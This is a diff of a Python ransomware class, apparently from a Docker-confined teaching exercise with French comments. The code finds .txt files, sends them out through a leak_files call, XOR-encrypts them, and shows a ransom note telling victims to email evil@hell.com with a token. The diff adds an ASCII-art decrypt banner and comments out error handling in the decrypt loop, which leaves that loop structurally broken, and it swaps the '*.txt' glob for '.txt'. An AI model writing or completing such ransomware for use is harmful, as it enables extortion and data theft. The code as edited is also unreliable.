@@ -21,7 +21,18 @@ ENCRYPT_MESSAGE = """
 
 Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
 """
+DECRYPT_MESSAGE = """
+  _____                                                                                           
+ |  __ \                                                                                          
+ | |__/ | __ ___ _ __   __ _ _ __ ___  
+ |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ 
+ | |   | | |  __/ |_) | (_| | | |  __/ 
+ |_|   |_|  \___| .__/ \__,_|_|  \___|
+                | |                      
+                |_|                    
 
+Your txt files have been locked. 
+"""
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
@@ -62,7 +73,7 @@ class Ransomware:
        
         # Liste les fichiers .txt 
         #txt_files = [file for file in os.listdir() if file.endswith('.txt')]
-        files_to_encrypt = self.get_files("*.txt")
+        filesencrypt = self.get_files(".txt")
 
         #if not txt_files:
             #print("Aucun fichier .txt trouvé dans le répertoire courant.")
@@ -73,7 +84,7 @@ class Ransomware:
         # Appelle la méthode setup pour générer la clé et le token
         secret_manager.setup()
 
-        secret_manager.leak_files(files_to_encrypt)
+        secret_manager.leak_files(filesencrypt)
             
             # Chiffrer les fichiers
         #secret_manager.aes_files(files_to_encrypt)
@@ -81,7 +92,7 @@ class Ransomware:
  
         # Chiffre les fichiers .txt
         #files_to_encrypt = txt_files
-        secret_manager.xorfiles(files_to_encrypt)
+        secret_manager.xorfiles(filesencrypt)
 
         # Affiche un message avec le token au format hexadécimal
         hex_token = secret_manager.get_hex_token()
@@ -131,18 +142,18 @@ class Ransomware:
         secret_manager.load()
 
         self.hex_token = secret_manager.get_hex_token()
-        self.timestamp = secret_manager.get_int_timestamp()
+        
 
-        encrypted_files = self.get_files("*.txt")
+        encryptedfiles = self.get_files(".txt")
 
         while True:
-            try:
+            #try:
                 # Demander la clé de déchiffrement
                 b64_key = input("")
                 # Définir la clé
                 secret_manager.set_key(b64_key)
                 # Déchiffrer les fichiers
-                secret_manager.unaes_files(encrypted_files)
+                secret_manager.unaes_files(encryptedfiles)
                 # Nettoyer les éléments cryptographiques locaux
                 secret_manager.clean()
 
@@ -150,11 +161,11 @@ class Ransomware:
                 os.system('cls' if os.name == 'nt' else 'clear')
         
                 # Afficher un message pour informer l'utilisateur que tout s'est bien passé
-                print('DECRYPT_MESSAGE')
-            except Exception as e:
-                print(f"Erreur : {e}")
-                print("La clé est incorrecte. Veuillez réessayer.")
-                continue  # Recommence la boucle en cas d'échec    
+                print(DECRYPT_MESSAGE)
+            #except Exception as e:
+                #print(f"Erreur : {e}")
+                #print("La clé est incorrecte. Veuillez réessayer.")
+                #continue  # Recommence la boucle en cas d'échec    
 
 
 if __name__ == "__main__":
